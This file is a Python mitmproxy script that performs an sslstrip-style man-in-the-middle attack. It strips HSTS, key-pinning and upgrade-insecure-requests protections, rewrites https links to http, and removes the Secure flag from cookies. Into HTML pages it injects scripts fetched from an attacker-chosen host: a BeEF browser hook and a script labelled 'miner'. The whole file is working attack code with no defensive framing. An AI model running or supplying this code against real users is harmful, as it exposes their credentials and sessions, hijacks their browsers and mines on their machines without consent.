"""
This script implements an sslstrip-like attack based on mitmproxy.
https://moxie.org/software/sslstrip/
"""
from bs4 import BeautifulSoup
from mitmproxy import ctx, http
import argparse, re, urllib

# set of SSL/TLS capable hosts
secure_hosts = set()

class Injector:
    def __init__(self, path):
        self.path = path

    def response(self, flow: http.HTTPFlow) -> None:

        flow.response.headers.pop('Strict-Transport-Security', None)
        flow.response.headers.pop('Public-Key-Pins', None)

        # strip links in response body
        flow.response.content = flow.response.content.replace(b'https://', b'http://')

        # strip meta tag upgrade-insecure-requests in response body
        csp_meta_tag_pattern = b'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
        flow.response.content = re.sub(csp_meta_tag_pattern, b'', flow.response.content, flags=re.IGNORECASE)

        # strip links in 'Location' header
        if flow.response.headers.get('Location', '').startswith('https://'):
            location = flow.response.headers['Location']
            print("\n"+location+"\n")
            hostname = urllib.parse.urlparse(location).hostname
            print("HOSTNAME: "+hostname)
            if hostname:
                secure_hosts.add(hostname)

            flow.response.headers['Location'] = location.replace('https://', 'http://', 1)

        # strip upgrade-insecure-requests in Content-Security-Policy header
        if re.search('upgrade-insecure-requests', flow.response.headers.get('Content-Security-Policy', ''), flags=re.IGNORECASE):
            csp = flow.response.headers['Content-Security-Policy']
            flow.response.headers['Content-Security-Policy'] = re.sub('upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)

        if self.path:
            html = BeautifulSoup(flow.response.content, "html.parser")
            #print(self.path)
            #print(flow.response.headers)
            if not 'Content-Type' in flow.response.headers:
                print("\nNo content type in headers. Get over it.")
            elif 'text/html' in flow.response.headers['Content-Type']:
                #print(flow.response.headers["content-type"])
                miner = html.new_tag(
                    "script",
                    src="http://"+self.path+":8000/script.js",
                    type='application/javascript')
                beef = html.new_tag(
                    "script",
                    src="http://"+self.path+":3000/hook.js",
                    type='application/javascript')
                html.insert(0, miner)
                html.insert(0, beef)
                flow.response.content = str(html).encode("utf8")
                print("\nScripts injected.\n\n")
            else:
                print("\nWrong content type. Sorry.")
                print(str(flow.response.headers['Content-Type']) + "\n\n")


        # strip secure flag from 'Set-Cookie' headers
        cookies =  flow.response.headers.get_all('Set-Cookie')
        cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
        flow.response.headers.set_all('Set-Cookie', cookies)


    def request(self, flow):
        flow.request.headers.pop('If-Modified-Since', None)
        flow.request.headers.pop('Cache-Control', None)

        # do not force https redirection
        flow.request.headers.pop('Upgrade-Insecure-Requests', None)

        # proxy connections to SSL-enabled hosts
        if flow.request.pretty_host in secure_hosts:
            flow.request.scheme = 'https'
            flow.request.port = 443
        else:
            flow.request.scheme = 'http'
            flow.request.port = 80

        flow.request.host = flow.request.pretty_host

def start():
    parser = argparse.ArgumentParser()
    parser.add_argument("path", type=str)
    args = parser.parse_args()
    return Injector(args.path)
